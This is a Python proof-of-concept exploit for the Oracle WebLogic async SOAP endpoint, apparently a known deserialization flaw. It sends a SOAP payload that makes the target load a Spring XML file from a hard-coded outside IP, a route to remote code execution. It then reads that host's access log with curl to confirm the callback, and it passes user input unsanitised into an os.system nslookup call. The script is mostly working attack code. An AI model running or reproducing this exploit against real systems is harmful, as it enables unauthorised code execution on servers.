import requests
import re
import sys
import time
import os
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

targeturl = ""


class IsUrlOk():
    def refactorurl(self, url):
        global targeturl
        if re.findall("http", url):
            return
        else:
            if re.findall(r":\d?443", url):
                targeturl = "https://" + sys.argv[1]
                # print("x443 port find ,try https")
                return
            else:
                targeturl = "http://" + sys.argv[1]
                return

    def isconnected(self, url):
        global connected
        try:
            requests.get(url, verify=False, timeout=3)
            print("Server access normal !")
        except IOError:
            print("Server bad !")
            sys.exit(0)

    def isurlok(self, url):
        global targeturl
        try:
            targeturl = sys.argv[1]
        except IndexError:
            print("Are you kidding me? Please input url !")
            sys.exit(0)
        self.refactorurl(targeturl)
        print("Cheacking :", targeturl)
        self.isconnected(targeturl)

class PoC:
    def request(self, dsturl):
        headers={
            'Content-Type': 'text/xml;charset=UTF-8',
            "SOAPAction": '""',
            'Content-Length': '642',
            'User-Agent': 'Apache-HttpClient/4.1.1 (java 1.5)',
            'Connection': 'close'
        }

        proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080",
        }
        post_data="<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java><class><string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string><void><string>http://149.28.87.236/</string></void></class></java>    </work:WorkContext>   </soapenv:Header>   <soapenv:Body>      <asy:onAsyncDelivery/>   </soapenv:Body></soapenv:Envelope>"
        try:
            return requests.post(dsturl, verify=False, timeout=10, headers=headers,data=post_data)
        except IOError:
            return ""

    def check(self):
        url = targeturl + "/_async/AsyncResponseService"
        logs = self.request(url)
        print("\n下面是 PoC 返回信息：\n")
        print("\n服务器响应信息：\n")
        print(logs)
        print(logs.headers)
        # print(logs.url.replace("https://","").replace(""))
        time.sleep(1)
        print("\n自建服务器日志信息（最后三条）:\n")
        # subprocess.call('curl http://149.28.87.236/access.log|tail -n 3 ',shell=True)#这两种方式二选一
        os.system('curl -s http://149.28.87.236/access.log|tail -n 3 ')
        print("\n域名对应 IP:")
        host=sys.argv[1].replace("https://","").replace("http://","")
        os.system('nslookup '+re.sub(":\d*", "", host))


if __name__ == '__main__':
    timestart = time.time()
    checkurl = IsUrlOk()
    checkurl.isurlok(targeturl)
    timemiddle = time.time()
    Jewel = PoC()
    Jewel.check()
    timeend = time.time()
    print("")
    print("scanned in " + str(timeend - timestart) + " seconds")
